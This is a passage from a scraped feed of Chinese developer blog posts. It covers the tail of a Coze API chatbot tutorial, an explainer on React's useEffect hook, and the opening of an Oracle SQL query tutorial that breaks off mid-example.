    <span class="hljs-comment">// 6.9 从响应中提取 AI 的回答</span>
    <span class="hljs-comment">//     Coze 的响应结构中，messages 数组包含对话历史</span>
    <span class="hljs-comment">//     最后一条通常是 AI 的回复，且 role 为 'assistant'</span>
    <span class="hljs-keyword">const</span> aiMessage = data.<span class="hljs-property">messages</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">msg</span> =&gt;</span> msg.<span class="hljs-property">role</span> === <span class="hljs-string">'assistant'</span>)?.<span class="hljs-property">content</span> || <span class="hljs-string">'抱歉，我无法回答这个问题。'</span>;

    <span class="hljs-comment">// 6.10 在聊天框中显示 AI 的回复（右侧气泡）</span>
    <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'ai'</span>, aiMessage);

  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// 6.11 错误处理：网络问题、API 限流、认证失败等</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error:'</span>, error);
    <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'ai'</span>, <span class="hljs-string">'哎呀，出错了！请稍后再试~'</span>);
  }
}

<span class="hljs-comment">// 7. 辅助函数：向聊天框追加消息</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">appendMessage</span>(<span class="hljs-params">sender, text</span>) {
  <span class="hljs-comment">// 7.1 创建一个新的消息 div 元素</span>
  <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  
  <span class="hljs-comment">// 7.2 根据发送者设置 CSS 类名（用于样式区分）</span>
  messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'message'</span>, sender);
  
  <span class="hljs-comment">// 7.3 设置消息内容（注意：这里未做 XSS 防护，生产环境需转义）</span>
  messageElement.<span class="hljs-property">textContent</span> = text;
  
  <span class="hljs-comment">// 7.4 将消息元素添加到聊天容器末尾</span>
  chatBox.<span class="hljs-title function_">appendChild</span>(messageElement);
  
  <span class="hljs-comment">// 7.5 自动滚动到底部，确保最新消息可见</span>
  chatBox.<span class="hljs-property">scrollTop</span> = chatBox.<span class="hljs-property">scrollHeight</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-7">五、关键细节解析</h2>
<h3 data-id="heading-8">安全提醒</h3>
<ul>
<li><code>VITE_API_KEY</code> <strong>绝不能暴露在前端生产环境</strong>！<br/>
当前 demo 仅适用于本地开发或演示。<br/>
<strong>正确做法</strong>：通过你自己的后端代理请求，由后端持有 <code>API_KEY</code>，前端只与你的服务器通信。</li>
</ul>
<h3 data-id="heading-9">RAG 如何生效？</h3>
<p>当你在 Coze 后台上传了课程文档，Coze 会自动将其向量化。当用户提问时：</p>
<ol>
<li>系统先在知识库中检索相关片段</li>
<li>将片段 + 用户问题一起送入 LLM</li>
<li>LLM 基于上下文生成准确回答</li>
</ol>
<blockquote>
<p>✅ 这就是为什么“喂饭”知识库比单纯依赖模型更重要！</p>
</blockquote>
<h3 data-id="heading-10">样式与交互</h3>
<p><code>index.html</code> 代码内容</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Coze API Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Coze API DEMO 随处智能<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"ipt"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入问题"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"reply"</span>&gt;</span>think...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./src/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>运行该文件后，在浏览器页面右键点击检查，打开控制台，输入问题并将焦点移出输入框，控制台将显示内容</p>
<p>当网页从<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/575382cd11844414947cf5e4026274d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUFB6Zi_Z2lhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507646&amp;x-signature=YLytmh9kBmlFEHNlJ622tmo6s38%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>转变为<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2e8ebb7ae674315b2f909228ee7a5f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUFB6Zi_Z2lhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507646&amp;x-signature=6zVYAZ1UNtW%2Fx0ABp4Hy16scCos%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>即为运行成功</p>
<hr/>
<h2 data-id="heading-11">六、扩展可能</h2>
<ul>
<li><strong>支持图片上传</strong>：Coze API 支持多模态输入，可让学生拍照提问编程题。</li>
<li><strong>会话记忆</strong>：通过维护 <code>conversation_id</code> 实现上下文连续对话。</li>
<li><strong>虚拟数字人</strong>：结合语音合成（TTS）与动画，打造拟人化客服。</li>
</ul>
<hr/>
<h2 data-id="heading-12">结语</h2>
<p>通过 Coze，我们不再需要从零训练模型，而是<strong>聚焦于知识的组织与交付</strong>。正如那句老话：“授人以鱼不如授人以渔”——而 Coze 让你既能“给鱼”，又能“教钓鱼”。</p>
<p>现在，打开你的编辑器，把那个沉睡的知识库唤醒，让它变成一个 7×24 小时在线的智能助手吧！</p>
<blockquote>
<p>🌟 <strong>你的知识，值得被 AI 更好地讲述。</strong></p>
</blockquote>
<p>Happy Coding！🤖✨</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[组件与外部世界的桥梁：一文读懂 useEffect 的核心机制]]></title>    <link>https://juejin.cn/post/7579889969986142259</link>    <guid>https://juejin.cn/post/7579889969986142259</guid>    <pubDate>2025-12-05T02:55:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579889969986142259" data-draft-id="7579892134816677923" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="组件与外部世界的桥梁：一文读懂 useEffect 的核心机制"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2025-12-05T02:55:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮蛋小精灵"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            组件与外部世界的桥梁：一文读懂 useEffect 的核心机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮蛋小精灵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:55:43.000Z" title="Fri Dec 05 2025 02:55:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>简单来说，<code>useEffect</code> 是 React 函数组件中用来处理<strong>副作用 (Side Effects)</strong> 的钩子。</p>
<p>你可以把它理解为“<strong>组件与外部世界沟通的桥梁</strong>”。</p>
<p>组件的核心任务是<strong>渲染</strong>（把数据变成 UI），这是一个纯净的计算过程。但有时候你需要做一些“<strong>不纯净</strong>”的事情，比如：</p>
<ul>
<li>去服务器拿数据。</li>
<li>手动改一下网页标题。</li>
<li>设置一个定时器。</li>
<li>监听鼠标滚动。</li>
</ul>
<p>这些事情都不能在渲染过程中直接做，必须交给 <code>useEffect</code> 在<strong>渲染结束后</strong>去做。</p>
<hr/>
<h3 data-id="heading-0">它的三个核心作用（对应类组件的生命周期）</h3>
<p>如果你熟悉 React 类组件，<code>useEffect</code> 相当于 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 这三个生命周期的组合体。</p>
<h4 data-id="heading-1">1. 组件挂载时执行 (Mount)</h4>
<p>“组件刚出现时，做点什么。”</p>
<p>比如：页面一加载就请求 API，或者建立 WebSocket 连接。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组件挂载了（只运行一次）'</span>);
  <span class="hljs-title function_">fetchData</span>();
}, []); <span class="hljs-comment">// ✅ 空数组：代表没有任何依赖，只在出生时跑一次</span>
</code></pre>
<h4 data-id="heading-2">2. 依赖更新时执行 (Update)</h4>
<p>“当某个数据变了，做点同步工作。”</p>
<p>这是 useEffect 最核心的设计理念：同步。保持组件内部状态和外部系统同步。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'userId 变了，我要重新获取用户信息'</span>);
  <span class="hljs-title function_">fetchUserInfo</span>(userId);
}, [userId]); <span class="hljs-comment">// ✅ 依赖数组：只要 userId 变，我就重跑</span>
</code></pre>
<h4 data-id="heading-3">3. 组件卸载/清理时执行 (Unmount / Cleanup)</h4>
<p>“组件要消失了（或者依赖变了），把之前的烂摊子收拾一下。”</p>
<p>比如：清除定时器、取消订阅、断开连接，防止内存泄漏。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Tick'</span>), <span class="hljs-number">1000</span>);

  <span class="hljs-comment">// 👇 返回一个清理函数</span>
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-built_in">clearInterval</span>(timer);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组件卸载了，或者下次 Effect 运行前，先清理旧的定时器'</span>);
  };
}, []);
</code></pre>
<hr/>
<h3 data-id="heading-4">总结一张表</h3>






























<table><thead><tr><th><strong>写法</strong></th><th><strong>含义</strong></th><th><strong>对应类组件生命周期</strong></th></tr></thead><tbody><tr><td><code>useEffect(() =&gt; { ... })</code></td><td><strong>每次</strong>渲染后都跑</td><td><code>componentDidMount</code> + <code>componentDidUpdate</code></td></tr><tr><td><code>useEffect(() =&gt; { ... }, [])</code></td><td>只在<strong>第一次</strong>渲染后跑</td><td><code>componentDidMount</code></td></tr><tr><td><code>useEffect(() =&gt; { ... }, [prop])</code></td><td>只在 <strong>prop 变化</strong>后跑</td><td><code>componentDidUpdate</code> (带判断)</td></tr><tr><td><code>useEffect(() =&gt; { return () =&gt; ... }, [])</code></td><td>组件<strong>销毁</strong>时跑</td><td><code>componentWillUnmount</code></td></tr></tbody></table>
<h3 data-id="heading-5">一句话心法</h3>
<p><code>useEffect</code> 的作用是告诉 React： <strong>“等把界面画好之后，去帮我做这件这件额外的事（副作用）。如果我依赖的变量变了，记得重做一遍。”</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Oracle入门到删库跑路-04】基础入门：基本查询操作]]></title>    <link>https://juejin.cn/post/7579892222608998435</link>    <guid>https://juejin.cn/post/7579892222608998435</guid>    <pubDate>2025-12-05T02:54:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892222608998435" data-draft-id="7579886397074456576" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Oracle入门到删库跑路-04】基础入门：基本查询操作"/> <meta itemprop="keywords" content="数据库,Oracle"/> <meta itemprop="datePublished" content="2025-12-05T02:54:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="零日失眠者"/> <meta itemprop="url" content="https://juejin.cn/user/3411111810444068"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Oracle入门到删库跑路-04】基础入门：基本查询操作
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411111810444068/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    零日失眠者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:54:40.000Z" title="Fri Dec 05 2025 02:54:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">SELECT语句基础</h2>
<p>SELECT语句是SQL中最常用的查询语句，用于从数据库中检索数据。</p>
<h3 data-id="heading-1">基本语法</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> [<span class="hljs-keyword">DISTINCT</span>] column_list
<span class="hljs-keyword">FROM</span> table_name
[<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>]
[<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_list [<span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">DESC</span>]]
[LIMIT number];
</code></pre>
<h3 data-id="heading-2">查询所有列</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询employees表中的所有数据</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- 查询departments表中的所有数据</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> departments;
</code></pre>
<h3 data-id="heading-3">查询指定列</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询员工的姓名和薪资</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- 查询部门名称</span>
<span class="hljs-keyword">SELECT</span> department_name <span class="hljs-keyword">FROM</span> departments;
</code></pre>
<h3 data-id="heading-4">使用列别名</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用AS关键字设置别名</span>
<span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">AS</span> "名字", last_name <span class="hljs-keyword">AS</span> "姓氏", salary <span class="hljs-keyword">AS</span> "薪资" <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- 省略AS关键字</span>
<span class="hljs-keyword">SELECT</span> first_name "名字", last_name "姓氏", salary "薪资" <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- 使用表达式别名</span>
<span class="hljs-keyword">SELECT</span> first_name <span class="hljs-operator">||</span> <span class="hljs-string">' '</span> <span class="hljs-operator">||</span> last_name <span class="hljs-keyword">AS</span> "全名", salary<span class="hljs-operator">*</span><span class="hljs-number">12</span> <span class="hljs-keyword">AS</span> "年薪" <span class="hljs-keyword">FROM</span> employees;
</code></pre>
<h2 data-id="heading-5">4.2 WHERE子句条件查询</h2>
<p>WHERE子句用于筛选满足特定条件的记录。</p>
<h3 data-id="heading-6">比较运算符</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 等于</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">=</span> <span class="hljs-number">17000</span>;

<span class="hljs-comment">-- 不等于</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">!=</span> <span class="hljs-number">90</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">&lt;&gt;</span> <span class="hljs-number">90</span>;

<span class="hljs-comment">-- 大于、小于</span>
